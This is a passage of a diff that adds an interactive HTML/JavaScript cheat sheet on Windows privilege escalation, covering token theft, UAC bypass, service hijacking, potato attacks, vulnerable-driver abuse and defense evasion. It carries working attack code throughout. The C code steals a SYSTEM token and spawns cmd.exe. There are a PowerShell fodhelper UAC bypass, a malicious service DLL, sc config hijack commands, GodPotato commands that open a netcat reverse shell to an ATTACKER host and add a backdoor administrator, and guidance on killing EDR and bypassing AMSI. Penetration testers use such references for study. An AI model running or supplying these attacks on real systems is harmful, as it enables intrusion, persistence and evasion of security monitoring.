@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Privilege Escalation (Windows) Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}.off{color:#ef4444;font-weight:600;font-size:.82em}.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#f59e0b,#ef4444,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.hd .sub{font-size:.62em;color:#374151}.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}.sb.on{background:#111318}.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}.ct{padding:10px 14px;overflow-x:auto}.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}.bx-b{padding:6px 10px}.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}.fd .tp{color:#6b7280;font-size:.82em}.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}.tg-s{padding:0 5px;font-size:.68em}.nt{margin:6px 0;padding:7px 10px;border-radius:6px}.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}.ct2:hover{background:#111827}.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}.cv.op{transform:rotate(90deg)}.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}.cb .cm{color:#4b5563}.cb .pp{color:#f59e0b}.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}.ti.op{border-color:#f9731640;background:#f9731608}.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}.ti.op .tn{color:#fdba74}.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}.dt{width:6px;height:6px;border-radius:2px;display:inline-block}.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+var SE=[
+{id:"tok",l:"A. Token Abuse",i:"\u{1F3AB}",c:"#f87171"},
+{id:"uac",l:"B. UAC Bypass",i:"\u{1F6E1}\uFE0F",c:"#60a5fa"},
+{id:"svc",l:"C. Service Exploits",i:"\u2699\uFE0F",c:"#a78bfa"},
+{id:"pot",l:"D. Potato Attacks",i:"\u{1F954}",c:"#fbbf24"},
+{id:"krn",l:"E. Kernel Exploits",i:"\u{1F4A5}",c:"#34d399"},
+{id:"tsk",l:"F. Tasks / GPO",i:"\u{1F4C5}",c:"#f59e0b"},
+{id:"reg",l:"G. Registry / File",i:"\u{1F4DD}",c:"#e879f9"},
+{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"I. Bypasses",i:"\u{1F525}",c:"#fb923c"}
+];
+var S={s:'tok',t:'flow'};
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
+function fTOK(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">TOKEN ABUSE & PRIVILEGE ESCALATION</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F3AB}","Token Impersonation","#f87171",F("","Steal token from higher-privilege process","")+F("","OpenProcessToken + DuplicateTokenEx","")+F("","CreateProcessWithTokenW for new process","")+F("","Or: ImpersonateLoggedOnUser for thread-level","")+F("","Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",""));
+h+=CRD("\u{1F50D}","Dangerous Privileges","#f87171",F("SeImpersonate","Impersonate tokens \u2192 Potato attacks, token theft","",true)+F("SeAssignPrimaryToken","Assign token to new process \u2192 Potato attacks","",true)+F("SeDebugPrivilege","Debug any process \u2192 inject into SYSTEM process","",true)+F("SeBackupPrivilege","Read any file \u2192 dump SAM, NTDS.dit","",true)+F("SeRestorePrivilege","Write any file \u2192 DLL hijack system services","",true)+F("SeTakeOwnershipPrivilege","Own any object \u2192 take ownership of system files","",true)+F("SeLoadDriverPrivilege","Load kernel driver \u2192 BYOVD, arbitrary kernel code","",true)+F("SeManageVolumePrivilege","Manage volumes \u2192 arbitrary file read",""));
+h+=CRD("\u{1F511}","Token Stealing from SYSTEM Processes","#f87171",F("","winlogon.exe, lsass.exe, services.exe run as SYSTEM","")+F("","OpenProcess(PROCESS_QUERY_INFORMATION)","")+F("","OpenProcessToken + DuplicateTokenEx(SecurityImpersonation)","")+F("","CreateProcessWithTokenW with stolen token",""));
+h+=CRD("\u{1F4BB}","Named Pipe Impersonation","#f87171",F("","Create named pipe, wait for SYSTEM to connect","")+F("","ImpersonateNamedPipeClient() after connection","")+F("","Foundation of all Potato attacks","")+F("","Service accounts (IIS, MSSQL) have SeImpersonate",""));
+h+='</div>';return h;
+}
+function fUAC(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">UAC BYPASS TECHNIQUES</div>';
+h+='<div class="fr">';
+h+=B("Medium Integrity","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","User is local admin but medium IL","")+F("","UAC prompt required for elevation","")+'</div>',200);
+h+=A("bypass");
+h+=B("Auto-Elevate Binary","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Trusted binary: autoElevate=true","")+F("","fodhelper, eventvwr, computerdefaults","")+F("","Reads our controlled registry key","")+'</div>',240);
+h+=A("hijack");
+h+=B("High Integrity","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Payload runs elevated","")+F("","No UAC prompt shown","")+'</div>',180);
+h+='</div>';
+h+='<div class="grd" style="margin-top:8px">';
+h+=CRD("\u{1F4C1}","fodhelper.exe","#60a5fa",F("","Set: HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command","")+F("","(Default) = payload.exe","")+F("","DelegateExecute = \\\"\\\" (empty)","")+F("","Start fodhelper.exe \u2192 runs elevated",""));
+h+=CRD("\u{1F4CA}","eventvwr.exe","#60a5fa",F("","Set: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command","")+F("","Hijacks mmc.exe launch","")+F("","Older technique, still works many builds",""));
+h+=CRD("\u{1F527}","CMSTPLUA COM Interface","#60a5fa",F("","CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}","")+F("","ICMLuaUtil::ShellExec method","")+F("","No file-on-disk signature check","")+F("","In-memory from C#/PowerShell",""));
+h+=CRD("\u{1F4E6}","DLL Hijacking (Auto-Elevate)","#60a5fa",F("","Windir env var spoofing: C:\\Windows \\System32","")+F("","Trailing space bypasses trusted path check","")+F("","sysprep.exe, winsat.exe as targets",""));
+h+='</div>';
+h+=N("KEY","#60a5fa","UAC bypass requires the user to already be in the local Administrators group. It elevates from <b>medium to high integrity</b>, not from standard user to admin.");
+return h;
+}
+function fSVC(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">SERVICE-BASED PRIVILEGE ESCALATION</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4C1}","Unquoted Service Paths","#a78bfa",F("","Path: C:\\Program Files\\My App\\service.exe","")+F("","Unquoted: Windows tries C:\\Program.exe first","")+F("","Drop payload at earlier path component","")+F("","Requires write perm to parent directory",""));
+h+=CRD("\u{1F512}","Weak Service Permissions","#a78bfa",F("","DACL allows SERVICE_CHANGE_CONFIG","")+F("","sc config vuln_svc binPath= payload.exe","")+F("","Restart \u2192 runs as service account","")+F("","Check: accesschk -uwcqv \\\"Users\\\" *",""));
+h+=CRD("\u{1F4E6}","Service DLL Hijacking","#a78bfa",F("","Missing DLL: NAME NOT FOUND in ProcMon","")+F("","Place malicious DLL in search path","")+F("","DLL must export ServiceMain or DllMain",""));
+h+=CRD("\u{1F527}","Writable Service Binary","#a78bfa",F("","Replace service EXE with payload","")+F("","Check: icacls, look for (M), (F), (W)","")+F("","Restart service \u2192 SYSTEM",""));
+h+=CRD("\u{1F504}","Service Registry Permissions","#a78bfa",F("","HKLM\\SYSTEM\\CurrentControlSet\\Services\\<n>","")+F("","If writable: modify ImagePath value",""));
+h+='</div>';return h;
+}
+function fPOT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">POTATO ATTACKS (SERVICE \u2192 SYSTEM)</div>';
+h+='<div class="fr">';
+h+=B("Service Account","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","IIS, MSSQL, Apache","")+F("","Has SeImpersonatePrivilege","")+'</div>',180);
+h+=A("coerce");
+h+=B("NTLM Relay Local","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Trick SYSTEM into authenticating","")+F("","Named pipe / COM abuse","")+'</div>',200);
+h+=A("impersonate");
+h+=B("SYSTEM","#fbbf24",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","ImpersonateNamedPipeClient()","")+F("","CreateProcessWithTokenW","")+'</div>',180);
+h+='</div>';
+h+='<div class="grd" style="margin-top:8px">';
+var P=[
+{n:"JuicyPotato",y:"2018",d:"COM + NTLM reflection. BITS CLSID. Patched Server 2019+.",c:"#f87171"},
+{n:"RoguePotato",y:"2020",d:"Remote OXID resolver. Bypasses 2019 fix. Needs outbound 135.",c:"#60a5fa"},
+{n:"PrintSpoofer",y:"2020",d:"Named pipe via Print Spooler. Simple, no outbound.",c:"#34d399"},
+{n:"SweetPotato",y:"2020",d:"Combines Rotten+Juicy+PrintSpoofer. Auto-selects.",c:"#a78bfa"},
+{n:"GodPotato",y:"2022",d:"DCOM/RPCSS. Server 2022 + Win 11. Gold standard.",c:"#fbbf24"},
+{n:"CoercedPotato",y:"2023",d:"Multiple coercion methods. Broad OS support.",c:"#e879f9"},
+{n:"EfsPotato",y:"2021",d:"EfsRpcOpenFileRaw. LSASS to named pipe.",c:"#f59e0b"}
+];
+P.forEach(function(p){h+='<div style="border-radius:6px;border:1px solid '+p.c+'20;background:'+p.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between"><span style="font-weight:700;color:'+p.c+';font-size:.74em">'+p.n+'</span><span style="font-size:.6em;color:#6b7280">'+p.y+'</span></div><div style="font-size:.66em;color:#9ca3af;margin-top:1px">'+p.d+'</div></div>';});
+h+='</div>';
+h+=N("PREREQUISITE","#fbbf24","All potato attacks require <b>SeImpersonatePrivilege</b> or <b>SeAssignPrimaryTokenPrivilege</b>. Held by service accounts (IIS, MSSQL) and NETWORK SERVICE / LOCAL SERVICE.");
+return h;
+}
+function fKRN(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">KERNEL EXPLOITS & DRIVER ABUSE</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4A5}","BYOVD (Bring Your Own Vulnerable Driver)","#34d399",F("","Load known-vulnerable signed driver","")+F("","Arbitrary R/W or code exec in kernel","")+F("","Dell dbutil_2_3.sys, RTCore64.sys","")+F("","Disable EDR, steal tokens","")+F("","Requires SeLoadDriverPrivilege or admin",""));
+h+=CRD("\u{1F527}","Token Overwrite (Kernel)","#34d399",F("","Find current EPROCESS structure","")+F("","Copy Token from SYSTEM EPROCESS","")+F("","Instant SYSTEM without new process",""));
+h+=CRD("\u{1F510}","Vulnerable Driver Catalog","#34d399",F("","loldrivers.io: full catalog with IOCTLs + CVEs","")+F("","MS driver block list (incomplete)","")+F("","HVCI blocks some but not all",""));
+h+=CRD("\u{1F4BB}","Kernel CVEs","#34d399",F("","CVE-2021-1732: Win32k (ITW)","")+F("","CVE-2023-28252: CLFS driver (ITW)","")+F("","CVE-2024-21338: appid.sys (Lazarus)","")+F("","PrintNightmare (CVE-2021-34527)","")+F("","systeminfo | findstr KB for patches",""));
+h+=CRD("\u{1F6E1}\uFE0F","Disabling EDR from Kernel","#34d399",F("","BYOVD \u2192 kernel R/W","")+F("","Remove process notify callbacks","")+F("","Zero minifilter pointers","")+F("","EDRSandblast, Backstab, Terminator",""));
+h+='</div>';return h;
+}
+function fTSK(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">SCHEDULED TASKS, GPO & LOGON ABUSE</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4C5}","Writable Task Binaries","#f59e0b",F("","Task runs as SYSTEM with writable binary","")+F("","Replace binary, wait for trigger","")+F("","schtasks /query /fo LIST /v to enumerate",""));
+h+=CRD("\u{1F4CB}","Task DLL Hijack","#f59e0b",F("","Task binary loads missing DLL from writable path","")+F("","ProcMon to find missing DLLs","")+F("","Both escalation and persistence",""));
+h+=CRD("\u{1F310}","GPO Abuse (Local)","#f59e0b",F("","If admin: add startup scripts via gpedit","")+F("","Scripts run as SYSTEM at boot",""));
+h+=CRD("\u{1F511}","Logon Script Hijack","#f59e0b",F("","HKCU\\Environment\\UserInitMprLogonScript","")+F("","Runs at every user logon","")+F("","Target admin user for escalation",""));
+h+=CRD("\u{1F504}","Startup Folder","#f59e0b",F("","All Users startup if writable","")+F("","C:\\ProgramData\\...\\StartUp","")+F("","Runs when ANY user logs in",""));
+h+='</div>';return h;
+}
+function fREG(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">REGISTRY & FILE SYSTEM ESCALATION</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4DD}","AlwaysInstallElevated","#e879f9",F("","HKLM + HKCU both set to 1","")+F("","MSI installs as SYSTEM","")+F("","msfvenom -f msi; msiexec /quiet /qn /i",""));
+h+=CRD("\u{1F504}","Autorun Registry Hijack","#e879f9",F("","HKLM\\...\\CurrentVersion\\Run if writable","")+F("","Runs at every logon for all users","")+F("","Also: RunOnce, RunServices",""));
+h+=CRD("\u{1F4E6}","DLL Search Order Hijacking","#e879f9",F("","App directory before System32","")+F("","If app dir writable: place malicious DLL","")+F("","Target: services, tasks, elevated apps",""));
+h+=CRD("\u{1F512}","SeBackup/SeRestore Abuse","#e879f9",F("","SeBackup: dump SAM/SYSTEM hives","")+F("","SeRestore: overwrite system DLL or service binary",""));
+h+=CRD("\u{1F527}","PATH Hijacking","#e879f9",F("","Writable directory early in PATH","")+F("","Admin calls tool without full path \u2192 yours runs",""));
+h+=CRD("\u{1F4CB}","DACL Abuse on Files/Folders","#e879f9",F("","Misconfigured ACLs after third-party installs","")+F("","icacls + accesschk for audit",""));
+h+='</div>';return h;
+}
+function fKIT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">ENUMERATION TOOLS</div>';
+h+='<div class="grd" style="margin-bottom:10px">';
+var T2=[
+{n:"WinPEAS",d:"Comprehensive automated enumeration. Color-coded severity. Services, registry, tasks, credentials.",c:"#f87171"},
+{n:"PowerUp",d:"PowerShell privesc checker. Service abuse, DLL hijacking, AlwaysInstallElevated, unquoted paths.",c:"#60a5fa"},
+{n:"SharpUp",d:"C# port of PowerUp. No PowerShell dependency. .NET assembly.",c:"#a78bfa"},
+{n:"Seatbelt",d:"Security-focused survey. Credentials, tokens, browser data, defensive products.",c:"#34d399"},
+{n:"BeRoot",d:"Common misconfigs. Services, tasks, registry, filesystem.",c:"#fbbf24"},
+{n:"PrivescCheck",d:"Modern PowerUp replacement. More checks, actively maintained.",c:"#e879f9"}
+];
+T2.forEach(function(t){h+='<div style="border-radius:6px;border:1px solid '+t.c+'20;background:'+t.c+'06;padding:5px 8px"><div style="font-weight:700;color:'+t.c+';font-size:.74em">'+t.n+'</div><div style="font-size:.66em;color:#9ca3af;margin-top:1px">'+t.d+'</div></div>';});
+h+='</div>';
+h+='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin:6px 0">ESCALATION DECISION TREE</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4CA}","Quick Wins (30 sec)","#f472b6",F("1.","whoami /priv \u2192 SeImpersonate? \u2192 Potato","")+F("2.","whoami /groups \u2192 Local Admin? \u2192 UAC bypass","")+F("3.","reg query AlwaysInstallElevated","")+F("4.","cmdkey /list \u2192 runas /savecred","")+F("5.","findstr /si password *.txt *.xml *.ini",""));
+h+=CRD("\u{1F527}","Service/Task Enum (2 min)","#f472b6",F("1.","wmic service get pathname \u2192 unquoted paths","")+F("2.","accesschk -uwcqv Users * \u2192 modifiable services","")+F("3.","schtasks /query /v \u2192 SYSTEM tasks","")+F("4.","icacls on binaries \u2192 writable?","")+F("5.","ProcMon \u2192 missing DLLs",""));
+h+=CRD("\u{1F50D}","Deep Enum (10+ min)","#f472b6",F("1.","Registry ACLs: service keys, Run keys","")+F("2.","Filesystem ACLs: Program Files, Windows dirs","")+F("3.","PATH: writable directories","")+F("4.","Installed software: known CVEs","")+F("5.","systeminfo: missing kernel patches",""));
+h+='</div>';return h;
+}
+function fBYP(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fb923c;letter-spacing:.06em;margin-bottom:6px">DEFENSE BYPASS FOR PRIVILEGE ESCALATION</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F6E1}\uFE0F","Credential Guard","#fb923c",F("","Isolates LSASS creds in VBS","")+F("","Blocks mimikatz sekurlsa, NTLM extraction","")+F("","Bypass: DCSync (network), DPAPI, Kerberos tickets",""));
+h+=CRD("\u{1F510}","PPL (Protected Process Light)","#fb923c",F("","LSASS as PPL blocks handle opening","")+F("","Bypass: PPLFault, BYOVD, mimidrv.sys",""));
+h+=CRD("\u{1F4BB}","WDAC / AppLocker","#fb923c",F("","WDAC: kernel-enforced, hard to bypass","")+F("","AppLocker: user-mode, bypassable (regsvr32, msbuild)","")+F("","WDAC + HVCI blocks unsigned drivers (BYOVD)",""));
+h+=CRD("\u{1F525}","Defender Evasion","#fb923c",F("","AMSI bypass + ETW patch before payload","")+F("","Check exclusions: drop payload in excluded path","")+F("","Tamper Protection blocks disabling from admin",""));
+h+=CRD("\u{1F504}","UAC Always Notify","#fb923c",F("","Highest setting: auto-elevate bypasses fail","")+F("","Rare: most orgs use default UAC",""));
+h+=CRD("\u{1F9EC}","Constrained Language Mode","#fb923c",F("","Blocks Add-Type, New-Object, reflection","")+F("","Bypass: C# binary, PSv2, custom runspace",""));
+h+='</div>';return h;
+}
+function getCodes(s){
+var C={};
+C.tok=[
+{t:"Token impersonation: steal SYSTEM token",l:"c",c:"void StealSystemToken(void) {\n    // Enable SeDebugPrivilege\n    HANDLE hToken;\n    OpenProcessToken(GetCurrentProcess(),\n        TOKEN_ADJUST_PRIVILEGES, &hToken);\n    TOKEN_PRIVILEGES tp;\n    tp.PrivilegeCount = 1;\n    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    LookupPrivilegeValue(NULL, SE_DEBUG_NAME,\n        &tp.Privileges[0].Luid);\n    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);\n\n    // Find SYSTEM process (winlogon.exe)\n    DWORD pid = FindProcessByName(\"winlogon.exe\");\n    HANDLE hProc = OpenProcess(\n        PROCESS_QUERY_INFORMATION, FALSE, pid);\n\n    // Steal and duplicate token\n    HANDLE hProcToken, hDupToken;\n    OpenProcessToken(hProc, TOKEN_DUPLICATE |\n        TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hProcToken);\n    DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED,\n        NULL, SecurityImpersonation,\n        TokenPrimary, &hDupToken);\n\n    // Spawn SYSTEM cmd.exe\n    STARTUPINFOW si = {sizeof(si)};\n    PROCESS_INFORMATION pi;\n    CreateProcessWithTokenW(hDupToken,\n        LOGON_NETCREDENTIALS_ONLY, NULL,\n        L\"cmd.exe\", CREATE_NEW_CONSOLE,\n        NULL, NULL, &si, &pi);\n}"},
+{t:"Enumerate token privileges",l:"ps",c:"# Check current privileges\nwhoami /priv\n\n# Key privileges:\n# SeImpersonatePrivilege    -> Potato attacks\n# SeAssignPrimaryToken      -> Potato attacks\n# SeDebugPrivilege          -> Token theft\n# SeBackupPrivilege         -> Read any file\n# SeRestorePrivilege        -> Write any file\n# SeLoadDriverPrivilege     -> BYOVD\n\n# Quick service account check:\nwhoami /priv | findstr /i \"impersonate\"\n\n# Check integrity level:\nwhoami /groups | findstr \"Label\"\n# Medium -> need escalation\n# High   -> admin\n# System -> SYSTEM"}
+];
+C.uac=[
+{t:"fodhelper.exe UAC bypass",l:"ps",c:"# fodhelper.exe bypass (medium -> high integrity)\nNew-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" `\n    -Name \"(Default)\" -Value \"C:\\temp\\payload.exe\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command\" `\n    -Name \"DelegateExecute\" -Value \"\" -Force\n\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden\n\n# Cleanup\nStart-Sleep -Seconds 3\nRemove-Item \"HKCU:\\Software\\Classes\\ms-settings\" -Recurse -Force\n\n# Alternatives:\n# computerdefaults.exe -> ms-settings\n# sdclt.exe -> Folder\\shell\\open\\command"},
+{t:"CMSTPLUA COM bypass (C#)",l:"c",c:"// COM object auto-elevates without UAC prompt\n// CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}\n//\n// Interface ICMLuaUtil:\n//   ShellExec(file, args, dir, nShow)\n//\n// Instantiate:\n//   CoGetObject(\"Elevation:Administrator!new:{CLSID}\",\n//     ref bo, ref iid, out obj);\n//\n// Execute:\n//   ((ICMLuaUtil)obj).ShellExec(\n//     \"C:\\\\temp\\\\payload.exe\", null, null, 1);\n//\n// Advantages:\n// - No file drop needed\n// - No registry modification\n// - Works from medium integrity C#"}
+];
+C.svc=[
+{t:"Service misconfiguration enumeration",l:"ps",c:"# 1. Unquoted paths with spaces\nwmic service get name,pathname,startmode |\n    findstr /i /v \"C:\\Windows\\\" | findstr /i /v '\"'\n\n# 2. Modifiable service binaries\nGet-WmiObject Win32_Service | ForEach-Object {\n    $path = ($_.PathName -split '\"')[1]\n    if (!$path) { $path = ($_.PathName -split ' ')[0] }\n    $acl = icacls $path 2>$null\n    if ($acl -match 'Users.*(F|M|W)') {\n        \"VULN: $($_.Name) -> $path\"\n    }\n}\n\n# 3. Modifiable service config (accesschk)\n# accesschk -uwcqv \"Everyone\" * /accepteula\n# Look for: SERVICE_CHANGE_CONFIG\n\n# 4. Exploit:\nsc config vuln_svc binPath= \"C:\\temp\\payload.exe\"\nsc stop vuln_svc\nsc start vuln_svc"},
+{t:"Service DLL hijack payload",l:"c",c:"#include <windows.h>\n\n// For svchost-hosted services:\nvoid WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {\n    system(\"C:\\\\temp\\\\payload.exe\");\n}\n\n// Generic DllMain:\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD reason, LPVOID reserved) {\n    if (reason == DLL_PROCESS_ATTACH) {\n        STARTUPINFO si = {sizeof(si)};\n        PROCESS_INFORMATION pi;\n        CreateProcessA(\"C:\\\\temp\\\\payload.exe\",\n            NULL, NULL, NULL, FALSE, 0,\n            NULL, NULL, &si, &pi);\n    }\n    return TRUE;\n}\n\n// Find targets: Process Monitor\n// Filter: Result = NAME NOT FOUND, Path ends .dll"}
+];
+C.pot=[
+{t:"GodPotato / PrintSpoofer usage",l:"bash",c:"# Check privilege:\nwhoami /priv | findstr SeImpersonate\n\n# GodPotato (Server 2022, Win 11):\nGodPotato.exe -cmd \"cmd /c whoami\"\n# nt authority\\system\n\n# Reverse shell:\nGodPotato.exe -cmd \"cmd /c nc.exe ATTACKER 4444 -e cmd\"\n\n# PrintSpoofer (simple, reliable):\nPrintSpoofer64.exe -i -c cmd\n\n# SweetPotato (auto-selects):\nSweetPotato.exe -p C:\\temp\\payload.exe\n\n# Add admin:\nGodPotato.exe -cmd \"net user backdoor P@ss /add\"\nGodPotato.exe -cmd \"net localgroup administrators backdoor /add\""}
+];
+C.krn=[
+{t:"BYOVD: load driver + disable EDR",l:"c",c:"// Load vulnerable signed driver:\n// sc create VulnDrv type= kernel binPath= C:\\temp\\vuln.sys\n// sc start VulnDrv\n\n// RTCore64.sys (MSI Afterburner):\n// IOCTL 0x80002048: physical memory read\n// IOCTL 0x8000204C: physical memory write\n\n// Token steal in kernel:\n// 1. Find current EPROCESS via ActiveProcessLinks\n// 2. Find SYSTEM EPROCESS (PID 4)\n// 3. Copy Token field\n\n// Disable EDR:\n// Zero PspNotifyEnableMask entries\n// Zero minifilter FltGlobals callbacks\n\n// Tools:\n// EDRSandblast - automated EDR killing\n// Backstab - kill EDR process\n// Terminator - multiple driver options\n// loldrivers.io - catalog"}
+];
+C.tsk=[
+{t:"Scheduled task enumeration and abuse",l:"ps",c:"# Find SYSTEM tasks with writable binaries\nGet-ScheduledTask | ForEach-Object {\n    $t = $_\n    if ($t.Principal.UserId -match 'SYSTEM|Admin') {\n        $exe = $t.Actions.Execute\n        if ($exe -and (Test-Path $exe)) {\n            $acl = icacls $exe 2>$null\n            if ($acl -match 'Users.*(F|M|W)') {\n                \"WRITABLE: $($t.TaskName) -> $exe\"\n            }\n        }\n    }\n}\n\n# Abuse:\ncopy payload.exe \"C:\\Path\\To\\task.exe\"\nschtasks /run /tn \"VulnerableTask\""}
+];
+C.reg=[
